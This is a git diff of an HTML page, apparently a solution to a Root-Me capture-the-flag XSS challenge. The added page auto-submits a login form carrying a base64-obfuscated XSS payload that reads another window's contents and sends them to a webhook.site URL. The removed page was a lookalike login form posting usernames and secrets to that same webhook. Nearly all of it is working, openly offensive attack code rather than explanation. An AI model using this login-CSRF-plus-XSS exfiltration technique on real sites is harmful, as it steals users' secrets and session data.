@@ -1,36 +1,19 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <title>Self XSS DOM Secrets - Secrets Keeper</title>
-    <meta charset="UTF-8">
-
-    <!--- favicon -->
-    <link rel="icon" type="image/png" href="/static/images/rootme.png"/>
-
-    <!--- css -->
-    <link rel="stylesheet" property="stylesheet" type="text/css" href="/static/css/style.css" media="all">
 </head>
 <body>
-<h1>Secrets Keeper</h1>
-
-<div style="display: flex; margin: auto; text-align: center; justify-content: center;">
-    <p>
-        <a href="http://challenge01.root-me.org:58003/login">Login</a> | <a href="http://challenge01.root-me.org:58003/profile">Profile</a> | <a href="http://challenge01.root-me.org:58003/report">Report</a>
-    </p>
-</div>
-
-<hr class="mgb-2">
-<div style="display: flex; margin: auto; text-align: center; justify-content: center;">
-    <fieldset style="width: 50%">
-        <legend>Login</legend>
-        <form method="POST" action="https://webhook.site/8fe6e4f2-cfe9-46f4-9013-a616cfbf4e35">
-            <label>Username</label><br>
-            <input id="username" class="mgb-1" name="username"></input><br>
-            <label>Secret</label><br>
-            <input id="secret" class="mgb-1" name="secret"></input><br>
-            <button class="mgb-1" type="submit">Login</button>
-        </form>
-    </fieldset>
-</div>
+<script>window.open('https://web-client-ch6.challenge01.root-me.org:58006/profile', 'kana_flag');</script>
+<form method="POST" action="https://web-client-ch6.challenge01.root-me.org:58006/login">
+  <input id="username" class="mgb-1" name="username" value=""/>
+  <input id="secret" class="mgb-1" name="secret" value="bbbbaaaa"/>
+  <button class="mgb-1" id="clickbtn" type="submit">Login</button>
+</form>
+<script>
+window.addEventListener('load', function(){
+document.getElementById("username").value = atob("YmxhYmxhIDwvcD48aW1nIHNyYz0idC5qcGciIG9uZXJyb3I9IndpbmRvdy5hZGRFdmVudExpc3RlbmVyKCdsb2FkJywgZnVuY3Rpb24oKXt3aW5kb3cubG9jYXRpb24gPSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvOGZlNmU0ZjItY2ZlOS00NmY0LTkwMTMtYTYxNmNmYmY0ZTM1Lz9mbGFnPScgKyB3aW5kb3cub3BlbignJywgJ2thbmFfZmxhZycpLmRvY3VtZW50LmJvZHkuaW5uZXJUZXh0fSk7Ii8+PHA+");
+document.getElementById("clickbtn").form.submit();
+});
+</script>
 </body>
 </html>
